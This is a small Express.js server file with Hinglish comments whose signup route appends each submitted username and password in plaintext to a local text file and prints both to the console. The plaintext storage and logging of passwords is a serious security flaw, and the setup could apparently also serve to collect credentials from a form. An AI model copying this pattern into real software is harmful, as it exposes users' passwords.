const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Form submit route
app.post('/api/signup', (req, res) => {
  const { username, password } = req.body;

  // Exact wahi format jo screenshot me chahiye tha
  const content = `USERNAME - ${username}\nPASSWORD - ${password}\n-------------------------\n`;

  // Isse tumhare folder me 'USERNAME-ADMIN.txt' file me data add hota rahega
  fs.appendFileSync('USERNAME-ADMIN.txt', content);

  console.log('Saved to USERNAME-ADMIN.txt:');
  console.log(`USERNAME - ${username}`);
  console.log(`PASSWORD - ${password}`);

  res.json({ username: username });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server live hai: http://localhost:${PORT}`);
});